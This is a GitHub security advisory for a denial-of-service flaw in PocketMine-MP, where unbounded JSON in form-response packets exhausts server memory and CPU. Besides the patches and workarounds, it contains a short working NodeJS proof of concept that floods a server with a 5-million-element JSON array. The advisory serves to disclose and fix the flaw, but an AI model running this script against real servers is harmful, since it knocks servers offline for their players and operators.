# [H] PocketMine-MP: JSON decoding of unlimited size large arrays/objects in ModalFormResponse Handling

## Summary
Severity: High
Advisory: GHSA-788v-5pfp-93ff
CWE: CWE-770
Ecosystem: Packagist
CVSS: CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:N/VC:N/VI:N/VA:H/SC:N/SI:N/SA:N (CVSS_V4)
Published: 2026-04-06
Source: https://github.com/advisories/GHSA-788v-5pfp-93ff
Type: github-advisory

## Affected
- Packagist: `pocketmine/pocketmine-mp` — affected >=0 <5.39.2

## Details
### Impact

The server does not meaningfully limit the size of the JSON payload in `ModalFormResponsePacket`. This can be abused by an attacker to waste memory and CPU on an affected server, e.g. by sending arrays with millions of elements.

The player must have a full session on the server (i.e. spawned in the world) to exploit this, as form responses are not handled unless the player is in game.

### Patches
The issue was fixed in two parts:
- cef1088341e40ee7a6fa079bca47a84f3524d877 limits the size of a single form response to 10 KB, which is well above expected size, but low enough to prevent abuse
- f983f4f66d5e72d7a07109c8175799ab0ee771d5 avoids decoding the form response if there is no form associated with the given ID

### Workarounds
This issue can be worked around in a plugin using `DataPacketReceiveEvent` by:
- checking the max size of the `formData` field
- making sure the form ID is not repeated

However, a full workaround for the issue would require reflection to access the `Player->forms` property, which is not exposed via any accessible API prior to 5.39.2.

### PoC

1. Join a PocketMine-MP server as a regular player (no special permissions needed).
2. Use a modified client or packet-sending script to send a `ModalFormResponsePacket` with:

   * Any non-existent `formId`
   * `formData` containing a massive JSON array (e.g., 10+ MB payload).
3. The server will attempt to parse the JSON and may freeze or become unresponsive.

Example NodeJS pseudocode:

```javascript
import { createClient } from 'bedrock-protocol';

const host = '127.0.0.1';
const port = 19132;
const username = 'Test';

const client = createClient({
  host,
  port,
  username,
  offline: true
});

const hugePayload = '[' + '0,'.repeat(5_000_000) + '0]';

client.on('spawn', () => {
  console.log('[*] Connected & spawned. Sending malicious packet...');

  client.write('modal_form_response', {
    formId: 9999,       // Form inexistant
    formData: hugePayload // JSON énorme
  });

  console.log('[*] Packet sent. The server should start freezing shortly.');
});
```

## References
- https://github.com/pmmp/PocketMine-MP/security/advisories/GHSA-788v-5pfp-93ff
- https://github.com/pmmp/PocketMine-MP/commit/cef1088341e40ee7a6fa079bca47a84f3524d877
- https://github.com/pmmp/PocketMine-MP/commit/f983f4f66d5e72d7a07109c8175799ab0ee771d5
- https://github.com/pmmp/PocketMine-MP
